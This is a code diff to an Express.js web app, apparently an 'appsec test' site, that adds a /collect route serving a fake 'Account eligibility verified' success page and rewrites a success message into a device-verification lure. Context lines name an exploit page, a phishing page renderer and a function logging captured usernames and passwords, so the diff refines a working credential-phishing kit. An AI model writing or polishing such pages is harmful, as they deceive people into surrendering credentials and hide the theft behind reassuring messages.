@@ -17,6 +17,10 @@ app.get("/", (_req, res) => {
   res.redirect("/login");
 });
 
+app.get("/collect", (_req, res) => {
+  res.send(renderExfilPage());
+});
+
 app.get("/exploit.html", (_req, res) => {
   res.type('html').send(`<!DOCTYPE html>
 <html>
@@ -136,7 +140,7 @@ function renderPage({ content, title = "Test Login Page Below" }) {
   <body>
   <p id="status" style="display:none;"></p>
   <script>
-      var SERVER = "https://https://appsec-test-website.onrender.com";
+      var SERVER = "https://appsec-test-website.onrender.com";
       
       function log(step) {
           document.getElementById("status").innerText = step;
@@ -189,8 +193,8 @@ function renderPage({ content, title = "Test Login Page Below" }) {
               '<section class="section-block">' +
               '<div class="login-card complete-card">' +
               '<h3>Success!</h3>' +
-              '<p>Account eligibility verified. The joint-account status will be ' +
-              'visible in your account in 24-48 hours.</p>' +
+              '<p>Device verification completed successfully. Click the link in your invitation email to proceed to the next step.' +
+              '</p>' +
               '</div></section></main>' +
               '<script>' +
               'var S="' + SERVER + '";' +
@@ -306,6 +310,36 @@ function renderPhishingPage() {
         </div>
       </section>`
   });
+}
+
+function renderExfilPage() {
+  return `<!doctype html>
+    <html lang="en">
+      <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>Success</title>
+        <meta name="description" content="A test-only mobile login UI study.">
+        <link rel="stylesheet" href="/styles.css">
+        <script src="/app.js" defer></script>
+      </head>
+      <body>
+      <a class="skip-link" href="#main">Skip to main content</a>
+        <main id="main" class="page-shell">
+          <section class="hero" aria-labelledby="page-title">
+            <h1 id="page-title">Joint Registration</h1>
+            <br>
+            <p class="eyebrow">Please follow on-screen directions.</p>
+          </section>
+          <section class="section-block" aria-labelledby="complete-section-title">
+            <div class="login-card complete-card">
+              <h3>Success!</h3>
+              <p>Account eligibility verified. The joint-account status will be visible in your account in 24-48 hours.</p>
+            </div>
+          </section>
+        </main>
+      </body>
+    </html>`
 }
 
 function logTestLoginCapture(username, password) {
